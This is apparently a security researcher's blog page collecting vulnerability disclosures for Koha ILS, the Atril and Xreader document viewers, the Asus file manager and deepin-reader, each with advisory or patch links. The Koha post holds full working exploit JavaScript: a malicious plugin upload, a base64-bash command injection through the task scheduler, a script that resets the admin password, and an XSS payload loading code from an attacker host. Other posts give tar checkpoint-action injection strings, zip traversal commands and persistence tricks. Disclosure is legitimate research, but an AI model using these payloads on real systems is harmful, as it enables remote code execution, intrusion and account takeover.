Refer:

<https://filebrowser.org/configuration/command-runner>

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/command-runner.png?w=855)

**PATCH**

Update to the latest version as the flaw has been patched from v2.18.0

Commit: <https://github.com/filebrowser/filebrowser/commit/74b7cd8e81840537a8206317344f118093153e8d>

**CVE-2021-46398**

**Thank you.**

Search for:

# Recent Posts

* [Privilege Escalation Vulnerability in Balena Etcher Software](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/)
* [CVE-2024-28739, CVE-2024-28740: XSS to One-Click RCE in Koha ILS](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/)
* [CVE-2023-44452, CVE-2023-51698: CBT File Parsing Argument Injection that affected Popular Linux Distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/)
* [CVE-2023-44451, CVE-2023-52076: EPUB File Parsing Directory Traversal RCE Vulnerability affecting popular distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/)
* [Zip Path Traversal in Asus Smartphone’s default FileManager App.](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/)
# Recent Comments

# Archives

* [August 2024](https://febin0x4e4a.wordpress.com/2024/08/)
* [March 2024](https://febin0x4e4a.wordpress.com/2024/03/)
* [January 2024](https://febin0x4e4a.wordpress.com/2024/01/)
* [December 2023](https://febin0x4e4a.wordpress.com/2023/12/)
* [October 2023](https://febin0x4e4a.wordpress.com/2023/10/)
* [September 2023](https://febin0x4e4a.wordpress.com/2023/09/)
* [January 2023](https://febin0x4e4a.wordpress.com/2023/01/)
* [March 2022](https://febin0x4e4a.wordpress.com/2022/03/)
* [January 2022](https://febin0x4e4a.wordpress.com/2022/01/)
# Categories

* [Uncategorized](https://febin0x4e4a.wordpress.com/category/uncategorised/)

[Create a free website or blog at WordPress.com.](https://wordpress.com/?ref=footer_website)

* Subscribe
  Subscribed

  + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2024%2F03%2F07%2Fxss-to-one-click-rce-in-koha-ils%2F&signup_flow=account)
* Privacy
* + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2024%2F03%2F07%2Fxss-to-one-click-rce-in-koha-ils%2F&signup_flow=account)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://febin0x4e4a.wordpress.com)
  + [View site in Reader](https://wordpress.com/read/blogs/201901473)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

![](https://pixel.wp.com/b.gif?v=noscript)
Design a site like this with WordPress.com[Get started](https://wordpress.com/start/?ref=marketing_bar)


=== Content from febin0x4e4a.wordpress.com_44e0f986_20250115_193553.html ===

# [febiNJ](https://febin0x4e4a.wordpress.com/)

## InfoSec Enthusiast

Menu
[Skip to content](#content)

* [Home](https://febin0x4e4a.wordpress.com/)
* [About](https://febin0x4e4a.wordpress.com/about/)

Search

Search for:

# Hacking

# [CVE-2024-28739, CVE-2024-28740: XSS to One-Click RCE in Koha ILS](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/)

[7th March 202417th April 2024](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/#respond)

```
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2024/03/koha2.png)

PART-1 (Arbitrary Command Injection) [CVE-2024-28739]

An Arbitrary Command injection vulnerability has been discovered in the latest version (23.05) of Koha ILS. The vulnerability is present in the Task Scheduler feature, which allows arbitrary input from the user and appends it to a system command.
An Attacker can Schedule a task and intercept and modify the HTTP request using a proxy tool like BurpSuite and inject arbitrary system commands with backticks (`) inside the "format=" parameter, the arbitrary command will then execute on the system at the scheduled time.

Severity: HIGH

The HTTP request will look something like this:

mode=job_add&starttime=09%3A40&startdate=&report=1&format=text`[Arbitrary Command here]`&email=

The command Task Scheduler is scheduling a command on the system that will look something like this:

export KOHA_CONF="/etc/koha/sites/library/koha-conf.xml"; /usr/share/koha/bin/cronjobs/runreport.pl 1 --format=text --to=

Steps to Reproduce:

1. Log in to Koha Intranet as Admin Staff
2. Go to Task Scheduler (/cgi-bin/koha/tools/scheduler.pl)
3. Schedule a task, and set the time for the job to execute (current server time+2 minutes)
4. Intercept the HTTP Request and Inject any arbitrary command

mode=job_add&starttime=[TIME here]&startdate=&report=1&format=text`[Arbitrary Command here]`&email=

5. Forward the request.
6. Important thing to note here is that this is a Blind Arbitrary Command Injection i.e., we wouldn't be able to see the command output but it will execute anyways. So use "whoami>/tmp/whoami.txt" as the injection command.

mode=job_add&starttime=09%3A40&startdate=&report=1&format=text`whoami+>/tmp/whoami.txt`&email=

7. Wait for some time and you will be able to see a file named whoami.txt being created in/tmp directory on the target server, if you read it will see "library-koha"(koha system username).

PART-2 (XSS to RCE) [CVE-2024-28740]

The above command injection vulnerability can only be exploited if the adversary has the credentials for the Koha Intranet Staff Admin user! Any ways to exploit this without having credentials? The answer is yes! We can trigger this RCE vulnerability just by sending the admin a URL/Link.

This can be achieved by abusing the "Additional contents (HTML customizations)" feature in Koha. This is basically a Cross-Site Scripting (XSS) vulnerability that can be used to bypass CSRF protections in Koha (SameSite=Lax cookie attribute and csrf_token). The HTML customizations feature allows the admin to add HTML content, it also accepts custom javascript.

This is where the problem arises, the attacker can carefully craft a URL with some malicious javascript that adds a task to Task Scheduler to trigger the Command Injection Vulnerability when the admin Staff patron loads the URL in his browser with an authenticated session of Koha, it will add the malicious script to "Additional contents" and the javascript will be executed. In this way, the attacker can gain access to the target system.

In fact, there's an httpOnly flag set for the cookie by Koha and Javascript can't just read the session cookie, this XSS can also be used to steal the CSRF token and forcefully change username and password to completely takeover the Admin Staff account.

If there is Plugin upload feature enabled by the admin, this can be used to drop a malicious plugin to Koha in the background to achieve Remote Code Execution on the target system.

 Proof-Of-Concept:

1. Open Koha Intranet URL
2. Navigate to
[Your Koha domainname]/cgi-bin/koha/tools/additional-contents.pl?op=add_validate&category=html_customizations&code=&idnew=38&redirect=/&editmode=wysiwyg&location=&&title_default=test&content_default=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&lang=default

This will execute a simple javascript alert to prove the existence of the vulnerability

I have developed fully working exploits for all the above issues (Authenticated RCE, XSS to RCE, XSS to Account takeover, XSS to plugin upload RCE),

i) I have developed Javascript code that directly uploads malicious plugins to Koha and enables the plugin without any Account takeover.

ii) To reproduce the issue, you may host the JS code yourself and include it in the XSS payload like '<script src="http://your.attacker.machine/xsrf_plugin.js"></script>'

xsrf_plugin.js:

-----------------------------------------------------------------
```
function csrf_to_rce(){

function dataURItoBlob(dataURI) {

  var byteString;

  if (dataURI.split(',')[0].indexOf('base64') >= 0)
    byteString = atob(dataURI.split(',')[1]);
  else
    byteString = unescape(dataURI.split(',')[1]);

  // separate out the mime component
  var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];

  // write the bytes of the string to a typed array
  var ia = new Uint8Array(byteString.length);

  for (var i = 0; i < byteString.length; i++) {
    ia[i] = byteString.charCodeAt(i);
  }

  return new Blob([ia], {
    type: mimeString
  });
}

var dataUri = "data:application/zip;base64,UEsDBAoAAAAAAHpk91YAAAAAAAAAAAAAAAAFABwAS29oYS9VVAkAA1DRvGSM0bxkdXgLAAEEAAAAAAQAAAAAUEsDBAoAAAAAAJVI+FYAAAAAAAAAAAAAAAAMABwAS29oYS9QbHVnaW4vVVQJAANS8b1kXPG9ZHV4CwABBAAAAAAEAAAAAFBLAwQKAAAAAAD2s/RWAAAAAAAAAAAAAAAAEAAcAEtvaGEvUGx1Z2luL1JjZS9VVAkAA3douWQyMr1kdXgLAAEEAAAAAAQAAAAAUEsDBBQAAAAIAJVI+FbYjsVGowEAAEYDAAASABwAS29oYS9QbHVnaW4vUmNlLnBtVVQJAANR8b1kMjK9ZHV4CwABBAAAAAAEAAAAAJVRXWvcMBB8169YzEEukFx8CX2Iy4XSkkIpbcMV8irW9t5ZjSU5+mh6lPz3rnxyc0nzUmEse3Z2d2ZXDNjc4Zbgs+2wqm76uFWmqtYNvRUieoIvtiXHyA25PkM18uv+YX6Y4qvqPcPHTLHRwez2ev3907evsIKiXCyLCdYUsMWAjP8WwMegJjg4qys44uZHJ2MUY+isex79SLUyOc6lSO5J1Ob4eXm+PC0vTsvLQ1Ic0tXmIsUTqdiTtDJKRy1/kvPKmrHS8nJRvlmUJT9lrqXx10taNC1t9tEJPZA7DSJLId84NYSJlLqETnkYxiECf60/XHOvRx6Y3/lAel48dBa1ujoLejgj0/A+ijRmseoI2wuoacPupSfTSk3e8zK9EPutQGftHYQOA7hoPDi17ULOYJggJ8B9pEip/eBswxi1grPzz1RWjqzF0HPvJgaW4GP9av+8XL2DOcw89ZsTmA3oUHs45tW/k6w/EV6ziFoq6awNyeXjX5uNs+aHraVJFvrdc4dsziizhTQc2DirAccE4IxJbNL6osg/Mv9fnRBLZv8BUEsBAh4DCgAAAAAAemT3VgAAAAAAAAAAAAAAAAUAGAAAAAAAAAAQAO1BAAAAAEtvaGEvVVQFAANQ0bxkdXgLAAEEAAAAAAQAAAAAUEsBAh4DCgAAAAAAlUj4VgAAAAAAAAAAAAAAAAwAGAAAAAAAAAAQAO1BPwAAAEtvaGEvUGx1Z2luL1VUBQADUvG9ZHV4CwABBAAAAAAEAAAAAFBLAQIeAwoAAAAAAPaz9FYAAAAAAAAAAAAAAAAQABgAAAAAAAAAEADtQYUAAABLb2hhL1BsdWdpbi9SY2UvVVQFAAN3aLlkdXgLAAEEAAAAAAQAAAAAUEsBAh4DFAAAAAgAlUj4VtiOxUajAQAARgMAABIAGAAAAAAAAQAAAO2BzwAAAEtvaGEvUGx1Z2luL1JjZS5wbVVUBQADUfG9ZHV4CwABBAAAAAAEAAAAAFBLBQYAAAAABAAEAEsBAAC+AgAAAAA=";

var blob = dataURItoBlob(dataUri);

         var formData = new FormData(),
          request  = new XMLHttpRequest();
          request.withCredentials = true;

    /** Configure the request */
    request.open( "POST", "http://library.kali.local:8001/cgi-bin/koha/plugins/plugins-upload.pl", true );

    formData.append( "uploadfile", blob, "feb.kpz" );
    formData.append("op","Upload");
    request.send(formData);
   }

csrf_to_rce();
fetct("/cgi-bin/koha/plugins/plugins-enable.pl?class=Koha::Plugin::Rce&method=enable"); //Plugin Enable

```
----------------------------------------------------------------

This above Javascript code will directly upload plugin without Account takeover.
The plugin will execute whoami command and stores it's output to /tmp/encode

3. I have created working JS code for Command Injection and Account takeover as well

rce.js:

-----------------------------------------------------------
```
fetch("/cgi-bin/koha/tools/scheduler.pl").then(response => response.text()).then((response) => {
window.server_time = response.match(/([0-9]{2}:[0-9]{2})/)[1];

var cmd = "whoami >/tmp/xss_sh";
var b64cmd = encodeURIComponent(btoa(cmd));
var inject = "echo+"+b64cmd+"|base64+-d|bash"
var hour = server_time.split(":")[0];
var min = server_time.split(":")[1];

if (Number(min)+2 > 60){
var sc_min = (Number(min)+2)%60
var strMin = `${sc_min}`.padStart(2, '0');
var strHr = String(Number(hour)+1)

fetch("/cgi-bin/koha/tools/scheduler.pl?mode=job_add&starttime="+strHr.padStart(2,"0")+":"+strMin+"&startdate=&report=1&format=text`"+inject+"`&email=");
} else {
var sc_min = (Number(min)+2)%60
var strMin = `${sc_min}`.padStart(2, '0');
var strHr = hour
fetch("/cgi-bin/koha/tools/scheduler.pl?mode=job_add&starttime="+strHr.padStart(2,"0")+":"+strMin+"&startdate=&report=1&format=text`"+inject+"`&email=");
}
 }).catch(err => console.log(err))

```
-----------------------------------------------------------

This above code will fetch server time from the target and schedules a task(server time + 2 minutes) with the arbitrary injected command.

xsrf_ato.js (Account takeover):

-------------------------------------------------------------
```
fetch("/cgi-bin/koha/members/member-password.pl?member=1").then(response => response.text()).then((response) => {window.csrf_token = response.match(/value=\"(.{92})\"/)[1];
const xhr = new XMLHttpRequest();
xhr.open("POST","/cgi-bin/koha/members/member-password.pl",true);
xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
xhr.send("destination=&borrowernumber=1&member=1&newuserid=admin&newpassword=Koha@pwn1234&newpassword2=Koha@pwn1234&csrf_token="+csrf_token);
}).catch(err => console.log(err))

```
-------------------------------------------------------------

This above JS will steal the CSRF token and performs a password reset. It sets admin:Koha@pwn1234 as Admin Staff credentials.

Thanks for reading,
Febin

```

# [CVE-2023-44452, CVE-2023-51698: CBT File Parsing Argument Injection that affected Popular Linux Distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/)

[17th January 2024](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/#respond)

*A Critical One-Click RCE/Command Injection Vulnerability Affecting Popular Linux Operating Systems with MATE, Cinnamon, and some Xfce desktop Environments.*

My 9th and 11th CVEs

**Affected Operating Systems:**

Linux Mint
Kali Linux (Popular OS among Security professionals, and researchers)
Parrot OS (Popular OS among Security professionals, and researchers)
Ubuntu-Mate
Xubuntu
Fedora Cinnamon
Fedora Mate
Manjaro Mate
Manjaro Cinnamon
Ubuntu Kylin (Official Chinese Ubuntu)
Kylin OS V10 ( OS said to be used in the Chinese Government Sectors )

And other MATE, Cinnamon, and some Xfce desktop Environments.

Affected Software Component: All versions including the latest versions of Atril Document Viewer (Default Doc reader for MATE environment, one of the popular doc readers) and Xreader Document Viewer (Default doc reader in Linux Mint)

**Vulnerability Summary:**

This vulnerability allows remote attackers to execute arbitrary code on affected installations of Linux Mint Xreader. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.

The specific flaw exists within the parsing of CBT files. The issue results from the lack of proper validation of a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code in the context of the current user.

This vulnerability is due to a bad code segment in Atril and Xreader responsible for handling comic book documents (.cbr, .cbz, .cbt, .cb7). Comic book documents are just archives that contain images in it. The vulnerability here can be exploited using a maliciously crafted CBT document which is a TAR archive.

Root Cause – Vulnerable Code segment in both doc viewers (comics-document.c):

```

static const ComicBookDecompressCommand command_usage_def[] = {
        /* RARLABS unrar */
    {"%s p -c- -ierr --", "%s vb -c- -- %s", NULL             , FALSE, NO_OFFSET},

        /* GNA! unrar */
    {NULL               , "%s t %s"        , "%s -xf %s %s"   , FALSE, NO_OFFSET},

        /* unzip */
    {"%s -p -C --"      , "%s %s"          , NULL             , TRUE , OFFSET_ZIP},

        /* 7zip */
    {NULL               , "%s l -- %s"     , "%s x -y %s -o%s", FALSE, OFFSET_7Z},

        /* tar */
    {"%s -xOf"          , "%s -tf %s"      , NULL             , FALSE, NO_OFFSET},

    /* UNARCHIVER */
    {"unar -o -"        , "%s %s"          , NULL         , FALSE, NO_OFFSET}
};

```

By looking at the above code, we can see that there are shell commands used for decompression. Look at the /\* tar \*/ section, it actually calls the following shell command, “tar -xOf -tf ![]()“. This is to view/load each image inside the CBT document. This behavior can be exploited by using an option of tar program ‘–checkpoint-action’ to execute arbitrary commands on the target by naming one of the images inside the CBT document to something like ‘–checkpoint-action=EXEC=bash -c “whoami>/tmp/who.txt”;.jpg’.

This vulnerability was already found in Evince Document viewer (the default Doc reader of GNOME) back in 2017. Since Atril and Xreader are forks of Evince, this vulnerability was present in both Atril and Xreader. Atril’s team fixed the vulnerability at that time by adding a piece of code that quits Atril’s process if the CBT file with “–checkpoint-action=” in its name. The following was the patch (comics-document.c) (line – 983):

```

extract_argv (EvDocument *document, gint page)
{
    ComicsDocument *comics_document = COMICS_DOCUMENT (document);
    char **argv;
    char *command_line, *quoted_archive, *quoted_filename;
    GError *err = NULL;

    if (g_strrstr (comics_document->page_names->pdata[page], "--checkpoint-action="))
    {
        g_warning ("File unsupported\n");
        gtk_main_quit ();
    }

```

As you can see, it throws a “File Unsupported” message to the console and quits when it sees “–checkpoint-action=” in a page/filename. I noticed that this only works with an empty file or a really small image file, and if we provide a larger file with more bytes, the “gtk\_main\_quit ();” function fails, so it continues to run, thus executing the injected arbitrary command.

In the MATE desktop environment, many XFCE and lightweight desktop environments (including OS like Kali, Parrot, Xubuntu, Ubuntu Mate, Kylin, Fedora Mate, Manjaro Mate), this vulnerability can be exploited just by sending a link/URL because these Operating Systems/Environments has Atril and Atril has an additional component called atril-previewer that will trigger the exploit without even opening or clicking on the document. An attacker can craft a webpage that instantly downloads the crafted CBT file onto the target system when the target user visits the webpage and the latest Firefox browser nowadays downloads automatically by default without user confirmation, when the user navigates to his Downloads directory the payload will be executed, gives the attacker the shell.

In Linux Mint (Cinnamon Desktop Environment), the target user must open the document to trigger the payload because Linux Mint uses Xreader and Xreader doesn’t have a previewer.

**Exploit**: <https://github.com/febinrev/atril_cbt-inject-exploit.git>

Exploit Dependencies: poppler-utils
Please install poppler-utils before running the exploit script on your Linux machine (Kali preferred). Installation: apt install poppler-utils.

**Github Advisory on MATE Atril**: <https://github.com/mate-desktop/atril/security/advisories/GHSA-34rr-j8v9-v4p2>

**Zero Day Initiative Advisory on Mint Xreader**: <https://www.zerodayinitiative.com/advisories/ZDI-23-1836/>

Thanks for Reading!

# [CVE-2023-44451, CVE-2023-52076: EPUB File Parsing Directory Traversal RCE Vulnerability affecting popular distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/)

[17th January 202417th January 2024](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/#respond)

My 8th and 10th CVEs

**Slippy-book: EPUB File Parsing Directory Traversal Remote Code Execution**

### CVE-2023-44451 (Xreader), CVE-2023-52076(Atril)(Reserved):

RCE Vulnerability affected popular Linux Distros including Mint, Kali, Parrot, Manjaro etc. EPUB File Parsing Directory Traversal Remote Code Execution

A Critical Path traversal and Arbitrary file write vulnerability has been discovered in the default document viewer software of Linux’s MATE/ and Linux Mint affecting popular operating systems such as Kali Linux, Parrot Security OS, Ubuntu-Mate, Linux Mint, Xubuntu, and all the other Operating Systems that use MATE or Atril/Xreader as default doc viewer.

The vulnerability exists in Atril Document Viewer and Xreader Document Viewer which are the default document viewers of the MATE environment and Linux Mint respectively. Atril is the default document reader for Kali Linux, Ubuntu-Mate, Parrot Security OS, and Xubuntu, and Xreader is the default document reader for Linux Mint.

This vulnerability is capable of writing arbitrary files anywhere on the filesystem to which the user opening a crafted document has access, the only limitation is that this vulnerability cannot be exploited to overwrite existing files but that doesn’t stop an attacker from achieving Remote Command Execution on the target system.

I named this vulnerability “*Slippy-Book*“

**Severity**: CRITICAL

**Impact**: Remote Command Execution, System compromise

This can be used particularly against security researchers who mostly use Kali and Parrot OS and also desktop users who use Linux Mint.

Remote Command Execution can be achieved in many ways:

1. The most efficient way to achieve RCE is by placing a malicious .desktop entry under $HOME/.config/autostart/ directory, and the .desktop will execute when the user logs out and logs back in, the autostart/ directory acts as the startup folder in Windows, and it will execute all the .desktop entries that are present inside at startup. We can place an infinite number of .desktop files with random names under autostart/ directory to achieve RCE, no need to overwrite any file.
2. By writing the authorized\_keys file under the .ssh/ directory inside the user’s home, in this way, an attacker can immediately achieve Command Execution via SSH if the target system has SSH enabled.
3. RCE can be achieved in another way just by writing files like .bash\_profile, .bash\_login, .zshrc, .cshrc, .vimrc, .xsession under the user’s home directory. Many of these files might be missing in operating systems, it depends on the OS. In Ubuntu-mate and Linux Mint, .bash\_profile, and .bash\_login files won’t be present, and placing those files with malicious commands written inside under the user’s home directory will result in RCE if the user logs in to the system without GUI mode, like SSH login.
4. Another way to achieve control over the target system is by writing files in places like ~/.local/bin, ~/.local/lib/python3.9/site-packages/, ~/.local/lib/python3.10/site-packages/, ~/.local/lib/python3.11/site-packages/, ~/.local/share/applications/, /var/www/html/, /var/www/ and so on.

**[+] Finding the Vulnerability:**

I was researching archive file formats such as Zip, Tar, Rar, etc., and the software that works with archives, then I got the idea to get into the Ebook file format (.epub) because .epub files are really Zip archives with some XML, HTML and other files packed inside. Even though Epub files are just zip files, epub format has its own standards.

**[\*] How did I find the vulnerability?**

People have been exploiting Archives since the early 2000s, researchers are constantly looking into Archives and archiving software for vulnerabilities and Zero-day acquisition companies like Zerodium are willing to pay million-dollar bounties for zero-days in archives and archivers. So, I thought to give it a try. I am not a binary ninja or kernel exploitation specialist to pull off a highly complicated exploit chain that could give me a code execution or elevation of privilege. My approach was, “What is the dumbest thing that could possibly work”.

Path traversal is one of the most common vulnerabilities that affect Archives and software that deals with archives, Zip Slip is one such vulnerability that leads to arbitrary file overwrite and Code execution that was disclosed on the 5th of June 2018 by the Snyk Security team, Zip Slip was a widespread vulnerability affected many software and libraries that handle Zip archives. Path traversal in zip archives was an ancient bug in the wild even before that was disclosed by the Snyk Security team. It is still present in many software including some Android file managers.
Another such vulnerability was discovered in WinRar with the CVE Id CVE-2018-20250, in which a potential path traversal can be exploited to achieve RCE.

Archives were developed in a period when people not much cared about security, and that’s where all the problems began.

Knowing that Path traversals can be a problem in the archive, I started testing it out on EPUB. I started off by downloading a sample .epub file from the internet and started playing with it. Then I did something really interesting, I added my own files into the .epub file by using the “zip -u” command.

`$ zip -u sample1.epub hello.txt`

And then when I listed the contents of the EPUB archive using “unzip -l”, I was able to see my hello.txt was present inside the EPUB. Perfect! So what’s next? As I said above, my approach was, “What is the dumbest thing that could possibly work” so what I did next was add a bunch of Path Traversal gadgets (../../) at the beginning of my filename hello.txt.

I was using Kali Linux and logged in as root during the research on archives.
Then, I navigated to the directory graphically and clicked on the EPUB document, the document opened up and nothing happened but after that, I noticed something really interesting, the hello.txt file was present under my Kali Linux’s root (/). I tried overwriting existing files but that didn’t work.

Then, I tried changing the filename to something like ../../../../tmp/test.txt and that worked too, a file named test.txt was successfully created under /tmp upon opening the epub document. First I thought it was a vulnerability in Kali Linux and downloaded the latest ISO of Kali from their official site and built a VM to test it out. Guess what? It worked on the latest version of Kali too. The software responsible for opening epub files in Kali is Atril, I then went to Google to read more about Atril Document Viewer and found out that it is the default Document reader for MATE desktop environment. After knowing that, I immediately switched to my Parrot OS VM to reproduce the same vulnerability, and that worked in Parrot OS as well. I also tested it out on Ubuntu’s MATE variant called Ubuntu-MATE and found that it was also vulnerable. The MATE desktop environment itself is vulnerable.

I also tried to reproduce this on various other Linux distros with other Desktop Environments and found out that Linux Mint is also vulnerable.

#### [+] Achieving Remote Command Execution:

This vulnerability can’t be exploited to overwrite existing files, it can only create new files under any specified locations, but that doesn’t stop us from achieving RCE. I tried out using the vulnerability to write a .desktop entry under $HOME/.config/autostart and then I logged out and logged back in, the malicious .desktop entry got triggered and I got Remote Command Execution. I also tried placing an authorized\_keys file under .ssh/ directory and achieved RCE via SSH. Note: If a directory is not present it will create the directory automatically.

Who knows about the Ebook format? Hasn’t everyone switched to PDF?

The answer is no, EPUB is still a popular and powerful document format, but many people prefer PDF. Most of them are familiar with PDFs. So, I was trying to maximize this vulnerability impact. Another Interesting thing I noticed was, when renaming the .epub document to something.pdf, the vulnerable Document Viewer (Atril/Xreader) tries to open the something.pdf file and reads it as an EPUB document because it is responsible for reading both EPUB and PDF, it also supports many other document formats as well. In other words, we can rename our crafted something.epub to something.pdf and then send it to the target to achieve RCE on the target.

So everything is good, we could create an exploit that’ll craft an epub/pdf pair to write malicious .desktop entries under /home//.config/autostart/ directory. But there’s a small problem, the target user’s username is required for successful exploitation of this bug. What if we don’t know the username? No Easy RCE? Needs to guess Username? Needs to try random common usernames? Let’s see what I got..

Upon further analysis, I found out that we can use the /proc/self/cwd to access the user’s home directory if he downloads the crafted document and opens it somewhere inside his home directory such as the ~/Downloads/, ~/Documents/ directory. So we can exploit the path traversal bug to achieve RCE just by using the gadget ../../../../../proc/self/cwd/../.config/autostart/exploit.desktop.

I have created a fully working exploit for this vulnerability (exploit\_rce.sh) and a script to write and include custom files for path traversal (exploit\_file\_write.sh).

**Exploit**: <https://github.com/febinrev/slippy-book-exploit.git>

**Zero Day Initiative Advisory:** <https://www.zerodayinitiative.com/advisories/ZDI-23-1835/>

*Update the Document Viewers to the latest version on your Distros!*

Thanks for Reading.

# [Zip Path Traversal in Asus Smartphone’s default FileManager App.](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/)

[10th January 2024](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/#respond)

**Zip Path traversal(ZipSlip) to arbitrary file write/overwrite in Asus default Android FileManager affecting all Asus Smartphones.**

This vulnerability is found in the latest version of the default file manager of Asus smartphones which comes pre-installed with the devices and also can’t be uninstalled. An attacker can create a crafted zip archive with path traversal to write/overwrite files in arbitrary locations on the target Smartphone. This vulnerability is dangerous as this can be abused to overwrite targetted files on the victim device or overwrite files that have patterns in the filenames like the photos taken from the camera, WhatsApp audio messages, WhatsApp Voice notes, Telegram Files, and much more. Also, Asus FileManager doesn’t prompt user confirmation before overwriting existing files which makes it easier for an attacker to exploit the vulnerability to overwrite existing files on the victim’s device.

**Severity**: *HIGH*

Affected Software and Version: Asus File Manager(com.asus.filemanager) <= 2.8.0.85\_230220 latest

**Proof-Of-Concept:**

1. Craft a path-traversal zip archive (here I created it on my Linux machine)

`$ echo PWNED > 001001001001001sdcard1poc1pwn.txt`

`$ zip trav.zip 001001001001001sdcard1poc1pwn.txt`

`$ sed -i s/"0"/"."/g trav.zip`

`$ sed -i s/"1"/"\/"/g trav.zip`

2. Transfer the zip file (trav.zip) to the Asus or Tecno device.
3. Open the archive and extract it with the default file manager
4. You will be able to see a file named pwn.txt under /sdcard/poc/pwn.txt

**Tested Devices:**

Asus Rog phone 5 and other devices with Asus Filemanager installed

# [CVE-2023-50254: Critical RCE in Deepin Linux Desktop OS’s default document reader](https://febin0x4e4a.wordpress.com/2023/12/22/cve-2023-50254-critical-rce-in-deepin-linux-desktop-oss-default-document-reader/)

[22nd December 202322nd December 2023](https://febin0x4e4a.wordpress.com/2023/12/22/cve-2023-50254-critical-rce-in-deepin-linux-desktop-oss-default-document-reader/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2023/12/22/cve-2023-50254-critical-rce-in-deepin-linux-desktop-oss-default-document-reader/#respond)

This is my 6th published CVE.

### Summary

Deepin Linux’s default document reader “**deepin-reader**” software ***<** **6.0.7***suffers from a serious vulnerability due to a design flaw that leads to Remote Command Execution via crafted docx document.

### Details

Deepin-reader is the default document reader for the Operating System Deepin Linux. The deepin-reader performs some shell command operations while dealing with docx document format.

1. When opening a docx document, deepin-reader creates a temporary directory under /tmp and place the docx document under the directory
2. Then deepin-reader calls the “unzip” shell command to extract the docx file
3. After the extraction process, deepin-reader calls “pandoc” command to convert the docx file to an HTML file named “temp.html” under word/ directory (created when the docx file is extracted with unzip).
   The command will look something like this, “pandoc temp.docx -o word/temp.html
4. Then deepin-reader will try to convert that HTML file to PDF and open the pdf.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2023/12/image.png?w=1024)

This happens when we open a docx file in Deepin Linux OS.

This behavior can be exploited by placing a symlink named word/temp.html inside a crafted malicious docx pointing to any file inside the target system.

So, while opening the docx file, pandoc will write to the system file that the symlink word/temp.html is pointing to.

This is a File overwrite vulnerability.
A Remote Code Execution can be achieved by overwriting files like .bashrc, .bash\_login etc. Rce will be triggered when the user opens the terminal.

We can force pandoc to write/overwrite files(.bashrc) in the right format to execute arbitrary commands.

**Advisory:** <https://github.com/linuxdeepin/developer-center/security/advisories/GHSA-q9jr-726g-9495>

Update Deepin Linux and deepin-reader to the latest version.

**Download the PoC exploit**: [https://github.com/febinrev/deepin-linux\_reader\_RCE-exploit/](https://github.com/febinrev/deepin-linux_reader_RCE-exploit/tree/main)

# [CVE-2021-40662 Chamilo LMS 1.11.14 RCE](https://febin0x4e4a.wordpress.com/2022/03/22/cve-2021-40662-chamilo-lms-1-11-14-rce/)

